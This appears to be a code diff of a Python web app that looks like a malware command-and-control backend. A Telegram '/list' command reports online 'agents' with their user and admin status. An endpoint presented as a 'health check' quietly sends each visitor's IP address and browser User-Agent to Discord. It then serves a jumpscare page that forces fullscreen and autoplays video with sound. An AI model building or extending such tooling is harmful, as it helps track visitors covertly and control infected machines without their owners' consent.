@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION v5 - Corrected Markdown in /list and updated jumpscare video.
+# FINAL VERSION - Corrected syntax error and includes all features.
 
 import os
 import re
@@ -121,7 +121,6 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for agent in active_agents:
                 is_admin_text = "Admin" if agent.get('is_admin') else "User"
                 agent_user = agent.get('user', 'N/A')
-                # --- THIS IS THE CORRECTED LINE ---
                 message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({esc(is_admin_text)}\\)`\n\n"
     except Exception as e:
         message = f"❌ Error fetching agent list: `{esc(str(e))}`"
@@ -225,7 +224,6 @@ def health_check_and_scare():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()
 
-    # --- Jumpscare HTML with the video you provided ---
     html_content = """
     <!DOCTYPE html>
     <html lang="en">
@@ -260,4 +258,28 @@ def health_check_and_scare():
                 scareContainer.style.display = 'block';
                 
                 scareVideo.muted = false;
-                scareVideo
+                scareVideo.play().catch(e => console.error("Autoplay failed:", e));
+
+                // When the video ends, it will stop. To make it loop, uncomment the following:
+                /*
+                scareVideo.onended = function() {
+                    this.currentTime = 0;
+                    this.play();
+                };
+                */
+
+                try {
+                    if (scareContainer.requestFullscreen) {
+                        scareContainer.requestFullscreen();
+                    } else if (scareContainer.webkitRequestFullscreen) {
+                        scareContainer.webkitRequestFullscreen();
+                    }
+                } catch (e) {
+                    console.log('Fullscreen API not supported.');
+                }
+            });
+        </script>
+    </body>
+    </html>
+    """
+    return html_content
